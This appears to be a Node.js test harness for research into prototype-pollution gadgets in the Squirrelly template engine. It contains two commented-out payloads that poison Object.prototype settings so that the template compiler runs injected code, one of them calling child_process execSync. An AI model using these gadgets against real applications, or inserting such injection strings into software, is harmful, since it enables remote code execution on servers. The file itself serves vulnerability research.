var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'each.sqrl');

// gadget 1
// Object.prototype.settings = {
//    'view options':{
//       'defaultFilter': "e')); console.log('RCE!');return tR;}}, params:[it.kids]})\n//",
//    }
// };

// gadget 2
// Object.prototype.n = "each')\nprocess.mainModule.require('child_process').execSync('sleep 10');\n//"
// Object.prototype.settings = {
//    'view options':{
//       prefixes: {
//          s: '',
//      }
//    }
// };

try{
   Object._expose.setupSymbols()
}
catch(e){
   console.log("[!] symbolic execution not enabled")
}


sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });